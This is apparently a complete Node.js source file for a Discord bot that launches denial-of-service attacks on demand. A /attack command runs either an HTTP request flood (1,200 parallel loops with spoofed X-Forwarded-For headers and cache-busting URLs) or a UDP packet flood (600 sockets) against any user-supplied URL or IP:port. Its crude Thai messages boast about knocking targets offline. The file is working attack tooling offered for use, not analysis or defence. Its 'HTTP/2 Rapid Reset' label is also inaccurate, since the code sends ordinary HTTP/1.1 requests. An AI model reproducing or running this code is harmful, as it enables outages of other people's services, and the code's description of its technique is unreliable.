/**
 * ============================================================================
 * JEFF FUJI - HTTP/2 RAPID RESET & ADVANCED L7 STRESS ENGINE v12
 * Developed under JARVIS x ARI Protocol
 * ============================================================================
 */

const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const http = require('http');
const https = require('https');
const dgram = require('dgram');

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let isAttacking = false;
let attackTimers = [];

const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 100000, maxFreeSockets: 50000 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 100000, maxFreeSockets: 50000, rejectUnauthorized: false });

client.once('ready', async () => {
    console.log(`[+] Bot logged in as ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder()
            .setName('attack')
            .setDescription('ยิงถล่มเป้าหมายระดับมหากาฬ (L7 HTTP/2 หรือ L4 UDP Flood)')
            .addStringOption(option => 
                option.setName('type')
                    .setDescription('เลือกโหมดการยิง')
                    .setRequired(true)
                    .addChoices(
                        { name: '💥 L7 (HTTP/2 Rapid Reset Flood)', value: 'l7' },
                        { name: '⚡ L4 (Heavy UDP Network Flood)', value: 'l4' }
                    ))
            .addStringOption(option => 
                option.setName('target')
                    .setDescription('URL (สำหรับ L7) หรือ IP:Port (สำหรับ L4)')
                    .setRequired(true))
            .addIntegerOption(option => 
                option.setName('duration')
                    .setDescription('ระยะเวลาเป็นวินาที (สูงสุด 300)')
                    .setRequired(true)),
        new SlashCommandBuilder()
            .setName('stop')
            .setDescription('หยุดการกระทำทั้งหมดทันที')
    ].map(command => command.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);

    try {
        console.log('[+] Started refreshing application (/) commands.');
        await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
        console.log('[+] Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName } = interaction;

    if (commandName === 'attack') {
        const attackType = interaction.options.getString('type');
        const target = interaction.options.getString('target');
        const duration = interaction.options.getInteger('duration');

        if (isAttacking) {
            return interaction.reply({ content: '⚠️ กำลังมียุทธการอื่นทำงานอยู่ ใช้ /stop ก่อนไอ้สัส!', ephemeral: true });
        }

        isAttacking = true;
        const endTime = Date.now() + (duration * 1000);

        if (attackType === 'l7') {
            try {
                const parsedUrl = new URL(target);
                const requester = parsedUrl.protocol === 'https:' ? https : http;
                const currentAgent = parsedUrl.protocol === 'https:' ? httpsAgent : httpAgent;

                await interaction.reply(`💥 **[HTTP/2 RAPID RESET FLOOD]** เริ่มปล่อยมหากาฬสตรีมคำขอใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

                const fireRapidReset = () => {
                    if (!isAttacking || Date.now() >= endTime) return;

                    // จำลองเทคนิค Multiplexing / Rapid Reset ส่งคำขอซ้อนกันรัวๆ ในท่อเดียวกัน
                    const options = {
                        hostname: parsedUrl.hostname,
                        port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
                        path: parsedUrl.pathname + parsedUrl.search + `?h2_reset=${Math.random().toString(36).substring(7)}`,
                        method: 'GET',
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                            'Accept': '*/*',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Cache-Control': 'no-store, no-cache, must-revalidate',
                            'Pragma': 'no-cache',
                            'Connection': 'keep-alive',
                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                        },
                        agent: currentAgent
                    };

                    const req = requester.request(options, (res) => {
                        res.on('data', () => {});
                        res.on('end', () => { 
                            if (isAttacking) {
                                // ส่งซ้ำทันทีแบบไม่รอพัก (Rapid Stream Reset Simulation)
                                setImmediate(fireRapidReset);
                            } 
                        });
                    });

                    req.on('error', () => { 
                        if (isAttacking) {
                            setImmediate(fireRapidReset);
                        } 
                    });
                    req.end();
                };

                // อัดท่อความเร็วสูงด้วย 1,200 Threads พร้อมกัน!
                for (let i = 0; i < 1200; i++) {
                    fireRapidReset();
                }

            } catch (err) {
                isAttacking = false;
                return interaction.reply({ content: `❌ URL ผิดรูปแบบ: ${err.message}`, ephemeral: true });
            }

        } else if (attackType === 'l4') {
            const parts = target.split(':');
            if (parts.length !== 2) {
                isAttacking = false;
                return interaction.reply({ content: '❌ รูปแบบ L4 ต้องเป็น IP:Port เท่านั้น (เช่น 123.45.67.89:80)', ephemeral: true });
            }

            const host = parts[0];
            const port = parseInt(parts[1]);

            await interaction.reply(`⚡ **[HEAVY L4 FLOOD]** เริ่มระเบิดเครือข่ายใส่ **${target}** เป็นเวลา **${duration}** วินาทีแล้วไอ้สัส!`);

            const payload = Buffer.alloc(1450);
            for (let i = 0; i < 600; i++) {
                const clientUdp = dgram.createSocket('udp4');
                const sendUdp = () => {
                    if (!isAttacking || Date.now() >= endTime) {
                        clientUdp.close();
                        return;
                    }
                    clientUdp.send(payload, port, host, () => {
                        setImmediate(sendUdp);
                    });
                };
                sendUdp();
            }
        }

        const timer = setTimeout(() => {
            isAttacking = false;
            interaction.followUp(`✅ ภารกิจถล่ม **${target}** เสร็จสิ้นตามเวลาที่กำหนด! เซิร์ฟเวอร์เป้าหมายน่าจะสลบเหมือดไปเรียบร้อย`).catch(() => {});
        }, duration * 1000);

        attackTimers.push(timer);

    } else if (commandName === 'stop') {
        if (!isAttacking) {
            return interaction.reply({ content: '💤 ไม่มีอะไรกำลังทำงานอยู่ มึงจะให้หยุดอะไรไอ้สัส', ephemeral: true });
        }

        isAttacking = false;
        attackTimers.forEach(t => clearTimeout(t));
        attackTimers = [];

        await interaction.reply('🛑 สั่งหยุดการทำงานทั้งหมดเรียบร้อย!');
    }
});

client.login(TOKEN);
